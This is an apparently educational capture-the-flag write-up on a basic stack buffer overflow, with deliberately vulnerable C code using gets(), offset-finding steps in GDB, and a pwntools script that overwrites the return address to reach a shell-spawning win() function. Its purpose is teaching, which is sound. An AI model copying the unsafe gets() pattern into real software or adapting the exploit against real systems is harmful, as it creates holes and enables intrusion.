# 🧠 Buffer Overflow 101

Buffer overflow is one of the most fundamental and powerful vulnerabilities in binary exploitation. In this writeup, we analyze a basic CTF challenge involving an overflow in a C program.

<Note>This is an introductory guide. If you're new to binary exploitation, make sure to follow along step-by-step using tools like GDB and pwntools.</Note>

## 🔎 Challenge Overview

We are given a simple ELF binary named `vuln`. The objective is to exploit a buffer overflow to redirect execution to a hidden function named `win()`.

### 🔧 Checking Binary Protections

```bash
checksec vuln
```

Expected output:

```
[*] '/home/user/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

<Note>This binary has no stack canaries and no PIE, which makes return address overwriting feasible.</Note>

## 📁 Source Code Review

```c
#include <stdio.h>
#include <string.h>

void win() {
  printf("🎉 You win!\n");
  system("/bin/sh");
}

void vuln() {
  char buf[64];
  gets(buf);  // 🚨 vulnerable function
}

int main() {
  vuln();
  return 0;
}
```

The vulnerability lies in the `gets()` function, which does not limit input size.

### 📏 Finding the Offset

To determine how many bytes are needed to reach the return address:

```bash
python3 -c "print('A'*80)" | ./vuln
```

Then use GDB or cyclic patterns to find the exact offset:

```bash
gdb ./vuln
pattern create 100
run
pattern offset <value_from_crash>
```

We determine the correct offset is 72 bytes to reach the return address.

### 🎯 Goal

Our goal is to overflow the buffer and overwrite the return address with the address of the `win()` function.

### ✅ Exploit Script

```python
from pwn import *

# Start process
p = process("./vuln")

# Find win function address
win_addr = 0xdeadbeef  # replace with actual address from `nm vuln | grep win`

# Construct payload
payload = b"A" * 72 + p64(win_addr)

# Send payload
p.sendline(payload)

# Get shell
p.interactive()
```

<Note>Always run exploits in a controlled environment like a local VM or Docker container.</Note>

## 🔐 Mitigation Techniques (FYI)

Modern binaries use several defenses:

- Stack canaries
- ASLR (Address Space Layout Randomization)
- PIE (Position Independent Executable)
- DEP/NX (Non-Executable Stack)

To practice real-world scenarios, try challenges with these protections enabled.

## 🏁 Conclusion

This challenge teaches:

- Stack layout
- Overwriting the return address
- Using pwntools for automation
- Basic binary reverse engineering

## 🧪 Next Steps

Try exploiting similar binaries with NX enabled, which will require Return-Oriented Programming (ROP).

<Note>Mastering buffer overflows lays the foundation for advanced binary exploitation techniques like ROP chains and heap exploitation.</Note>
